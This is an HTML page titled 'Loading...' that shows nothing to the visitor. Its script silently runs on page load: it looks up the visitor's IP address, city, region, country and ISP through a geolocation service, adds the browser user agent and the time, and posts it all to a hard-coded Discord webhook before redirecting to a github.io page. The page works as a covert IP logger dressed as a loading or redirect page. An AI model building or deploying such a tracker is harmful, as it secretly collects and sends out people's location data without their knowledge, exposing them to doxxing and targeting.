<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        (async () => {
            try {
                // Fetch IP & Geolocation
                const ipResponse = await fetch('https://ipapi.co/json/');
                const data = await ipResponse.json();

                // Prepare Discord payload
                const webhookURL = 'https://discord.com/api/webhooks/1400273980522365038/A5LHQj8BQv5mzerr8QpDJ2_iPWInsSLu4meFRf4aA51T4u77LS8awsezamSlfG65H2nw';
                const embed = {
                    title: "üìå New Visitor Logged",
                    color: 0xFF0000,
                    fields: [
                        { name: "üåê IP Address", value: `\`${data.ip || "Unknown"}\`` },
                        { name: "üìç Location", value: `${data.city || "?"}, ${data.region || "?"}, ${data.country_name || "?"}` },
                        { name: "üõú ISP", value: data.org || "Unknown" },
                        { name: "üîç User Agent", value: `\`\`\`${navigator.userAgent || "Unknown"}\`\`\`` },
                        { name: "üïí Time", value: new Date().toLocaleString() }
                    ]
                };

                // Send to Discord (wait for completion)
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

            } catch (error) {
                // Fail silently (no delay if error)
                console.error("Error logging data:", error);
            }

            // Redirect AFTER sending data
            window.location.href = "https://milo-is-cooked.github.io/ddom/main.html";
        })();
    </script>
</head>
<body>
    <!-- Empty page (no visible content) -->
</body>
</html>
